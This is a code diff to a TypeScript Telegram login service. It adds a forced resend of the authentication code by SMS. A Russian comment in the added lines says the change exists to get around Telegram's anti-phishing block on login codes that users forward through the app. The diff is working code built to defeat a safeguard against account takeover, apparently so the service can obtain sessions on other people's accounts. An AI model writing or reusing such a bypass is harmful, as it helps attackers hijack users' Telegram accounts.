@@ -128,10 +128,26 @@ export class TelegramService {
 
         const result = (await Promise.race([sendCodePromise, sendCodeTimeoutPromise])) as any;
 
+        // Принудительно переключаем на SMS-доставку.
+        // Telegram блокирует коды, которые пользователь пересылает через само приложение
+        // (антифишинговая защита). SMS-коды этой проверке не подвергаются.
+        const resendPromise = client.invoke(
+          new Api.auth.ResendCode({
+            phoneNumber: phoneNumber,
+            phoneCodeHash: result.phoneCodeHash,
+          }),
+        );
+        const resendTimeoutPromise = new Promise((_, reject) =>
+          setTimeout(() => reject(new Error('Resend code timeout')), 30000),
+        );
+        const resendResult = (await Promise.race([resendPromise, resendTimeoutPromise])) as any;
+        const phoneCodeHash = resendResult.phoneCodeHash ?? result.phoneCodeHash;
+        console.log(`[authenticate] Switched to SMS delivery, new hash: ${phoneCodeHash !== result.phoneCodeHash ? 'updated' : 'same'}`);
+
         // Сохраняем состояние для следующего запроса
         this.authStates.set(phoneNumber, {
           client: client!,
-          phoneCodeHash: result.phoneCodeHash,
+          phoneCodeHash,
           phoneNumber,
           createdAt: Date.now(),
         });
